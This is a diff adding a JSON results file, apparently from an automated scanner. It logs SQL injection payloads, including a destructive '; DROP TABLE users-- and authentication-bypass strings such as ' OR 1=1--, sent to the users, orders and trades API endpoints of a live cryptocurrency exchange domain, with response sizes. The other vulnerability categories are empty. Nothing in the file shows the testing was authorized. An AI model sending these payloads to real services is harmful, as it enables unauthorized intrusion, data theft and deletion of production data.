@@ -1,0 +1,99 @@
+{
+  "sql_injection": [
+    {
+      "endpoint": "https://crypto.com/api/v1/users",
+      "payload": "' OR 1=1--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/users",
+      "payload": "' UNION SELECT NULL--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/users",
+      "payload": "'; DROP TABLE users--",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/users",
+      "payload": "' OR '1'='1",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/users",
+      "payload": "admin'--",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/users",
+      "payload": "1' OR '1'='1'--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/orders",
+      "payload": "' OR 1=1--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/orders",
+      "payload": "' UNION SELECT NULL--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/orders",
+      "payload": "'; DROP TABLE users--",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/orders",
+      "payload": "' OR '1'='1",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/orders",
+      "payload": "admin'--",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/orders",
+      "payload": "1' OR '1'='1'--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/trades",
+      "payload": "' OR 1=1--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/trades",
+      "payload": "' UNION SELECT NULL--",
+      "response_size": 5476
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/trades",
+      "payload": "'; DROP TABLE users--",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/trades",
+      "payload": "' OR '1'='1",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/trades",
+      "payload": "admin'--",
+      "response_size": 394249
+    },
+    {
+      "endpoint": "https://crypto.com/api/v1/trades",
+      "payload": "1' OR '1'='1'--",
+      "response_size": 5476
+    }
+  ],
+  "xss_vulnerabilities": [],
+  "csrf_vulnerabilities": [],
+  "authentication_bypass": [],
+  "privilege_escalation": [],
+  "data_exposure": []
+}
